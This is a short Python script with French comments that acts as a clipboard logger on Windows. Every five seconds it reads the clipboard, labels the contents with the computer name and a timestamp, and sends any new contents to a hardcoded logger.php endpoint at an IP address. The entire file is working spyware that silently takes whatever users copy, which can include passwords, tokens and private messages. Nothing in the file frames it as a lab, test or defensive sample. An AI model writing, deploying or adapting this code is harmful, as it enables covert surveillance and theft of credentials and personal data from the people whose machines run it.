# coding:utf-8
# pip install pywin32
import win32clipboard as clip
import requests
import time
import os

date = time.strftime("%Y%m%d_%H%M%S")
pc_name = os.environ['COMPUTERNAME']


def get_clip():
    # Variables
    global data
    global clip_name
    clip_name = pc_name + "_" + date + '\n'
    clip.OpenClipboard()                                        # Ouverture du Clipboard
    data = clip.GetClipboardData().encode("utf-8")              # Récupération du contenu du clipboard
    clip.CloseClipboard()                                       # Fermeture du clipboard pour ne pas impacter la fonction


def send(data):
    # AVEC REQUESTS
    url = 'http://192.168.35.68:8080/logger.php?log='
    url_log = url + clip_name + data
    res = requests.post(url_log, data.decode("utf-8"))
    print(res.text)


def main():
    dataSent = ''
    while True:
        get_clip()
        print data + dataSent
        if data != dataSent:
            dataSent = data
            send(data)
        time.sleep(5)


main()
